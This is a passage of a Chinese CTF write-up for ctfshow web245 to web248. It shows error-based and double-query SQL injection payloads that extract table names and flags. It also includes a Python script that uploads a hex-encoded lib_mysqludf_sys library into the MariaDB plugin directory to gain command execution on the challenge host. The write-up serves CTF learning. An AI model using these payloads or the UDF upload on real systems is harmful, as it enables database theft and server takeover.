+banlist,ctfshow_flagsa,ctfshow_<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssuazn90tj311p0dlq49.jpg" alt="image-20210725072617818"></p>
+<ul>
+<li>查列</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; or extractvalue(1,concat(&#39;^&#39;,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagsa&#39;),&#39;^&#39;)) -- &amp;page&#x3D;1&amp;limit&#x3D;10
+
+
+id,flag1,info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssuc8iz02j613a0e00u502.jpg" alt="image-20210725072729006"></p>
+<ul>
+<li>查字段</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' or extractvalue(1,concat('</span><span class="token operator">^</span><span class="token string">',(select flag1 from ctfshow_flagsa),'</span><span class="token operator">^</span><span class="token string">')) -- &amp;page=1&amp;limit=10
+
+ctfshow&#123;5cf0c4d5-150a-4a82-87d8
+
+?id=1'</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token keyword">right</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- &amp;page=1&amp;limit=10</span>
+<span class="token number">2</span><span class="token operator">-</span><span class="token number">87</span>d8<span class="token operator">-</span><span class="token number">6</span>f33a60bff21&#125;
+
+ctfshow&#123;<span class="token number">5</span>cf0c4d5<span class="token operator">-</span><span class="token number">150</span>a<span class="token operator">-</span><span class="token number">4</span>a82<span class="token operator">-</span><span class="token number">87</span>d8<span class="token operator">-</span><span class="token number">6</span>f33a60bff21&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssufbff05j311v0d90u8.jpg" alt="image-20210725073026485"></p>
+<h2 id="Web246-双查询注入，向下取整"><a href="#Web246-双查询注入，向下取整" class="headerlink" title="Web246(双查询注入，向下取整)"></a>Web246(双查询注入，向下取整)</h2><p>基本格式</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><p>由于一定概率报错，<code>payload</code>多试几次</p>
+</li>
+<li><p>查表</p>
+</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">-- </span>
+
+ctfshow_flags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssuw0iiroj310f0f5764.jpg" alt="image-20210725074629580"></p>
+<ul>
+<li>查列</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='</span>ctfshow_flags'  <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">-- &amp;page=1&amp;limit=10</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssv68w2hhj310x0el405.jpg" alt="image-20210725075617340"></p>
+<ul>
+<li>查字段内容</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;&#39; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.columns group by a-- &amp;page&#x3D;1&amp;limit&#x3D;10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssv9gkh4cj310v0es409.jpg" alt="image-20210725075921209"></p>
+<h2 id="web247-双查询注入，向上取整"><a href="#web247-双查询注入，向上取整" class="headerlink" title="web247(双查询注入，向上取整)"></a>web247(双查询注入，向上取整)</h2><ul>
+<li>将<code>floor</code>换成向上取整的<code>ceil</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssvf6h8q7j30zl0ecmyj.jpg" alt="image-20210725080454910"></p>
+<ul>
+<li>类似上边</li>
+<li>最后查字段内容</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;&#39; union select 1,count(*),concat((select &#96;flag?&#96; from &#96;ctfshow_flagsa&#96; ),0x7e,ceil(rand()*2))a from information_schema.tables group by a-- &amp;page&#x3D;1&amp;limit&#x3D;10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gssvw4urc2j310v0eywge.jpg" alt="image-20210725082110208"></p>
+<h2 id="Web248"><a href="#Web248" class="headerlink" title="Web248"></a>Web248</h2><p>UDF:</p>
+<pre class="line-numbers language-none"><code class="language-none">UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>UDF脚本:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+base_url<span class="token operator">=</span><span class="token string">"http://700050d7-b807-4a61-b2b8-a046e50e2f0c.challenge.ctf.show:8080/api/"</span>
+payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>
+udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>
+    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>
+    url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select unhex('&#123;&#125;') into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+
